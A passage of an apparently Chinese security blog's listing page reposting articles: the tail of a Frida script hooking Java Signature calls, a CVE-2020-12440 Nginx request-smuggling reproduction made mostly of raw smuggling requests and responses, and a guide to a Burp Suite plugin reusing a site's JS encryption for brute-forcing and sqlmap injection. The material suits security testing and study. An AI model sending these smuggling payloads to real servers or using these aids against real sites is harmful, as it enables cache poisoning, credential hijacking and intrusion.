class="keyword">return</span> result</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Signature</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.Signature&#x27;</span></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> overloads_update = <span class="title class_">Signature</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> overloads_sign = <span class="title class_">Signature</span>.<span class="property">sign</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_sign) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">sign</span>()</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> sign result`</span>, result)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">sign</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Frida/" rel="tag">Frida</a><a class="tag-none-link" href="/tags/Hook/" rel="tag">Hook</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/05/21/CVE-2020-12440-Nginx/">
                （CVE-2020-12440）Nginx \&lt;= 1.8.0 请求走私
            </a>
        </h2>
    
    <time>
        May 21, 2024
    </time>
    <section class="content">
        <h1><span id="cve-2020-12440nginx-ltx3d-180-请求走私">（CVE-2020-12440）Nginx &lt;&#x3D; 1.8.0 请求走私</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20%3C%3D%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">nosafer</a> 并作补充</p>
</blockquote>
<h2><span id="一-漏洞简介">一、漏洞简介</span></h2><blockquote>
<p>Nginx 1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p>
</blockquote>
<h2><span id="二-漏洞影响">二、漏洞影响</span></h2><blockquote>
<p>Nginx &lt;&#x3D; 1.8.0</p>
</blockquote>
<h2><span id="三-复现过程">三、复现过程</span></h2><blockquote>
<p><img src="/2024/05/21/CVE-2020-12440-Nginx/1.png" alt="image"></p>
</blockquote>
<h3><span id="request">Request</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/poc.html</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span></span><br></pre></td></tr></table></figure>

<h3><span id="response">Response</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 01 May 2020 18:28:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Thu, 30 Apr 2020 14:36:32 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5eaae270-21&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="section">&lt;html&gt;</span><span class="section">&lt;h1&gt;</span><span class="attribute">Test</span> Page!&lt;/h1&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="language-apache"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Server</span>: nginx/<span class="number">1</span>.<span class="number">18</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Date</span>: Fri, <span class="number">01</span> May <span class="number">2020</span> <span class="number">18</span>:<span class="number">28</span>:<span class="number">44</span> GMT</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: text/html</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">15</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Last</span>-Modified: Thu, <span class="number">30</span> Apr <span class="number">2020</span> <span class="number">14</span>:<span class="number">35</span>:<span class="number">41</span> GMT</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br><span class="line"><span class="language-apache"><span class="attribute">ETag</span>: <span class="string">&quot;5eaae23d-f&quot;</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Ranges: bytes</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">NGINX</span> PoC File</span></span><br></pre></td></tr></table></figure>



<h2><span id="其他例子">其他例子</span></h2><h3><span id="request200-ok-405-method-not-allowed">Request（200 OK + 405 Method Not Allowed）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">46</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">TRACE</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>:www.<span class="number">0</span>-sec.org</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length:<span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">kk</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0s</span></span></span><br></pre></td></tr></table></figure>



<h3><span id="response200-ok-405-method-not-allowed">Response（200 OK + 405 Method Not Allowed）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:28:12 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>612</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:08:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5e9f1a9b-264&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-tag">body</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">35em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="language-xml">working. Further configuration is required.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>For online documentation and support please refer to</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">Commercial support is available at</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Thank you for using nginx.<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">HTTP/1.1 405 Not Allowed</span></span><br><span class="line"><span class="language-xml">Server: nginx/1.18.0</span></span><br><span class="line"><span class="language-xml">Date: Tue, 21 Apr 2020 16:28:12 GMT</span></span><br><span class="line"><span class="language-xml">Content-Type: text/html</span></span><br><span class="line"><span class="language-xml">Content-Length: 157</span></span><br><span class="line"><span class="language-xml">Connection: close</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>405 Not Allowed<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>405 Not Allowed<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.18.0<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3><span id="request200-ok-404-not-found">Request（200 OK + 404 Not Found）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.0-sec.org</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">46</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>:www.<span class="number">0</span>-sec.org</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length:<span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">kk</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0s</span></span></span><br></pre></td></tr></table></figure>



<h3><span id="response200-ok-404-not-found">Response（200 OK + 404 Not Found）</span></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:23:52 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>612</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Tue, 21 Apr 2020 16:08:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;5e9f1a9b-264&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-tag">body</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">35em</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="language-xml">working. Further configuration is required.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>For online documentation and support please refer to</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">Commercial support is available at</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Thank you for using nginx.<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">HTTP/1.1 404 Not Found</span></span><br><span class="line"><span class="language-xml">Server: nginx/1.18.0</span></span><br><span class="line"><span class="language-xml">Date: Tue, 21 Apr 2020 16:23:52 GMT</span></span><br><span class="line"><span class="language-xml">Content-Type: text/html</span></span><br><span class="line"><span class="language-xml">Content-Length: 153</span></span><br><span class="line"><span class="language-xml">Connection: keep-alive</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx/1.18.0<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/05/21/JSFlash-BurpSuite/">
                BurpSuite作为代理，复用目标站点的js代码处理指定的内容
            </a>
        </h2>
    
    <time>
        May 21, 2024
    </time>
    <section class="content">
        <h1><span id="burpsuite作为代理复用目标站点的js代码处理指定的内容">BurpSuite作为代理，复用目标站点的js代码处理指定的内容</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/247374.html">thinkoaa</a> 并作补充</p>
</blockquote>
<h2><span id="0x01-前言">0x01 前言</span></h2><blockquote>
<p>之前写了一个burp插件，直接使用目标站点的加密js来解决用intruder模块爆破时的payload加密问题</p>
<p>地址：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/242363.html">https://www.freebuf.com/sectool/242363.html</a></p>
<p>除了上面的情况外，有时还会遇到把burp当作代理，调用网站的js代码处理来自浏览器、sqlmap等工具的内容情况。</p>
<p>比如目标网站的参数调用了js加密算法，不管是手动访问也好，还是sqlmap注入也好，需要调用指定算法处理参数，用python或java重写算法的话呢，时间成本太高，有些算法还挺复杂……但，如果能够直接复用目标网站的js代码的话就太方便了。</p>
<p>因此，简单写了一个burp suite插件，专门解决上述问题：下载地址：<a target="_blank" rel="noopener" href="https://github.com/thinkoaa/JSFlash/">JSFlash</a></p>
<p>使用步骤是  可以参考我之前另一个插件的文章 <a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/242363.html">参考地址</a>：</p>
<ol>
<li>1.把目标站点的相关js代码放到本地js文件中，调试可用；</li>
<li>2.把JSFlash插件导入到Burp Suite中，在插件中加载指定的js文件并填写对应的参数；</li>
<li>3.抓包发repeater做测试，如果效果符合预期，则该插件会根据指定的规则，调用js代码，处理指定的内容。</li>
</ol>
<p>效果图：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/1.png" alt="image"></p>
</blockquote>
<h2><span id="0x02-使用方法">0x02 使用方法</span></h2><h3><span id="1从目标站点复制修改或者手动写好js代码调试正确">1.从目标站点复制修改或者手动写好js代码，调试正确</span></h3><blockquote>
<p><img src="/2024/05/21/JSFlash-BurpSuite/2.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/3.png" alt="image"></p>
<p>因为插件是通过java调用js，因此window、document等对象及方法，还有一些很新的js特性可能在浏览器中执行正确，但插件调用时会报错，因此插件会把可能产生的错误信息弹出显示，方便根据实际逻辑修改，根据我的经历来看，不管多复杂，只要耐心点，没有改不了的情况，如图：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/4.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/5.png" alt="image"></p>
<p>再举一个例：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/6.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/7.png" alt="image"></p>
</blockquote>
<h3><span id="2导入插件设置参数">2.导入插件，设置参数</span></h3><blockquote>
<p><img src="/2024/05/21/JSFlash-BurpSuite/8.png" alt="image"></p>
<p>2.1 设置url，一定要用burp的Copy URL菜单复制，不要手动填写，以免出错：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/9.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/10.png" alt="image"></p>
<p>2.2 设置处理指定内容的规则</p>
<p>GET方式:</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/11.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/12.png" alt="image"></p>
<p>php代码如图：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/13.png" alt="image"></p>
<p>处理结果：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/14.png" alt="image"></p>
<p>POST方式：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/15.png" alt="image"></p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/16.png" alt="image"></p>
<p>php代码如图：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/17.png" alt="image"></p>
<p>结果如图：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/18.png" alt="image"></p>
<p>一次调用多个方法，处理多个指定内容：</p>
<p>数据包：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/19.png" alt="image"></p>
<p>规则：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/20.png" alt="image"></p>
<p>php代码：</p>
<p><img src="/2024/05/21/JSFlash-BurpSuite/21.png" alt="image"></p>
<p>结果：</p>
